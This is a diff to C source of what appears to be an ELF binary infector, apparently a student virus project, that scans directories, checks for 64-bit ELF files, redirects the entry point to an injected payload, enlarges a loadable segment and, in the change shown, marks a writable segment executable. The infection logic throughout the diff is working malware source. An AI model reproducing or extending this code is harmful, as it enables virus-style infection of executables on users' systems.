@@ -53,7 +53,7 @@ struct linux_dirent64 {
  char            *ft_strnstr(char *s1, char *s2, size_t n);
  int             ft_strcmp(const char *s1, const char *s2);
 
-#define PAGE_SIZE (4096 * 3)
+#define PAGE_SIZE (0x4000)
 #define PAGE_SZ64 PAGE_SIZE
 # define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3)\
 type name(type1 arg1,type2 arg2, type3 arg3)\
@@ -118,14 +118,14 @@ extern int do_main(void);
 
 _start()
 {
-	char toto[2];
+		char toto[2];
 	toto[0] = '1';
 	toto[1] = '2';
 	write(1,toto,2);
 	__asm__(".globl real_start\n"
-	        "real_start:\n"
 //		 "int3\n"
-	        "call do_main\n");
+	        "real_start:\n"
+		    "call do_main\n");
 	exit(0);
 
 	asm(
@@ -698,7 +698,7 @@ int open_directory(char *path)
 	ft_putnbr(nread);
 
 	//printf("nread %d\n",nread);
-	__asm__("int3");
+//	__asm__("int3");
 	int c;
 	int i;
 	while ((nread = getdents64(dd, buf, 128)) > 0)
@@ -796,10 +796,20 @@ ft_putchar('\n');
 	ft_putnbr(size);
 	write(1, buff, 20);
 	ft_putchar('\n');
-	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
+
+	ft_putchar('3');
+	ft_putchar('.');
+	ft_putchar('1');
+	ft_putchar('\n');
+	if (size < sizeof(Elf64_Ehdr)  || buff[EI_MAG0] != 0x7f || buff[EI_MAG1] != 'E' || buff[EI_MAG2] != 'L' || buff[EI_MAG3] != 'F'  || buff[EI_CLASS] != ELFCLASS64)
 	{
+		ft_putchar('\n');
 		return (1);
 	}
+	ft_putchar('3');
+	ft_putchar('.');
+	ft_putchar('2');
+	ft_putchar('\n');
 	 if(0 && is_infected(buff))
 	 {
 	 	char deja[15];
@@ -836,36 +846,25 @@ ft_putchar('\n');
 	entry = hdr->e_entry;
 	phdr = (Elf64_Phdr*) (buff + hdr->e_phoff);
 	shdr = (Elf64_Shdr*) (buff + hdr->e_shoff);
-
+	uint64_t text;
 	// Increase section header offset by PAGE_SIZE
 
 	hdr->e_shoff += PAGE_SZ64;
 
 	for(int i=0; i < hdr->e_phnum; i++){
-		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_X)){
+		if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)){
 			//puts("text found");
-			text_end = phdr[i].p_offset + phdr[i].p_filesz;
+text = phdr[i].p_offset;
 
+			text_end = phdr[i].p_offset + phdr[i].p_filesz;
 			payload_vaddr = phdr[i].p_vaddr + phdr[i].p_filesz;
 			hdr->e_entry = payload_vaddr + 63;
-			phdr[i].p_filesz += PAGE_SZ64;
-			phdr[i].p_memsz += PAGE_SZ64;
-
-			for(int j=i+1; j < hdr->e_phnum; j++)
-				phdr[j].p_offset += PAGE_SZ64;
-
+			phdr[i].p_filesz += payload_len;
+			phdr[i].p_memsz += payload_len;
+			phdr[i].p_flags |= PF_X;
 			break;
 		}
 	}
-
-	for(int i=0; i < hdr->e_shnum; i++){
-		if(shdr[i].sh_offset > text_end)
-			shdr[i].sh_offset += PAGE_SZ64;
-
-		else if(shdr[i].sh_addr + shdr[i].sh_size == payload_vaddr)
-			shdr[i].sh_size += payload_len;
-	}
-
 	ft_putchar('4');
 	ft_putchar('\n');
 	new_file(buff,size,text_end, path,entry);
